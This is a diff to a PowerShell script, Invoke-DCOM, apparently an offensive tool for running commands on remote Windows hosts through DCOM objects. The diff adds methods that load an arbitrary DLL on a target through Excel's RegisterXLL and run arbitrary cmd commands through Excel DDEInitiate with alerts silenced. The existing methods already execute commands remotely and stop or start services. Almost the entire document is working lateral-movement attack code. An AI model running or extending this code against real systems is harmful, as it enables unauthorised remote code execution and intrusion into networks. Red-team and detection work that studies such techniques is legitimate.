@@ -24,11 +24,11 @@ function Invoke-DCOM {
 
         Invoke commands on remote hosts via MMC20.Application COM object over DCOM.
 
-    .PARAMETER Target
+    .PARAMETER ComputerName
 
         IP Address or Hostname of the remote system
 
-    .PARAMETER Type
+    .PARAMETER Method
 
         Specifies the desired type of execution
 
@@ -39,8 +39,9 @@ function Invoke-DCOM {
     .EXAMPLE
 
         Import-Module .\Invoke-DCOM.ps1
-        Invoke-DCOM -Target '192.168.2.100' -Type MMC20 -Command "calc.exe"
-        Invoke-DCOM -Target '192.168.2.100' -Type ServiceStart "MyService"
+        Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command "calc.exe"
+        Invoke-DCOM -ComputerName '192.168.2.100' -Method ExcelDDE -Command "calc.exe"
+        Invoke-DCOM -ComputerName '192.168.2.100' -Method ServiceStart "MyService"
 #>
 
     [CmdletBinding()]
@@ -50,9 +51,10 @@ function Invoke-DCOM {
         $ComputerName,
 
         [Parameter(Mandatory = $true, Position = 1)]
-        [ValidateSet("MMC20", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart")]
+        [ValidateSet("MMC20.Application", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart",
+        "DetectOffice","RegisterXLL","ExcelDDE")]
         [String]
-        $Method = "MMC20",
+        $Method = "MMC20.Application",
 
         [Parameter(Mandatory = $false, Position = 2)]
         [string]
@@ -60,7 +62,12 @@ function Invoke-DCOM {
 
         [Parameter(Mandatory = $false, Position = 3)]
         [string]
-        $Command= "calc.exe"
+        $Command= "calc.exe",
+
+        [Parameter(Mandatory = $false, Position = 4)]
+        [string]
+        $DllPath
+
     )
 
     Begin {
@@ -108,7 +115,7 @@ function Invoke-DCOM {
         #Begin main process block
 
         #Check for which type we are using and apply options accordingly
-        if ($Method -Match "MMC20") {
+        if ($Method -Match "MMC20.Application") {
 
             $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
@@ -162,6 +169,26 @@ function Invoke-DCOM {
             $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Document.Application.ServiceStart("$ServiceName")
+        }
+        elseif ($Method -Match "DetectOffice") {
+
+            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+            $Obj = [System.Activator]::CreateInstance($Com)
+            $isx64 = [boolean]$obj.Application.ProductCode[21]
+            Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
+        }
+        elseif ($Method -Match "RegisterXLL") {
+
+            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+            $Obj = [System.Activator]::CreateInstance($Com)
+            $obj.Application.RegisterXLL("$DllPath")
+        }
+        elseif ($Method -Match "ExcelDDE") {
+
+            $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
+            $Obj = [System.Activator]::CreateInstance($Com)
+            $Obj.DisplayAlerts = $false
+            $Obj.DDEInitiate("cmd", "/c $Command")
         }
     }
 
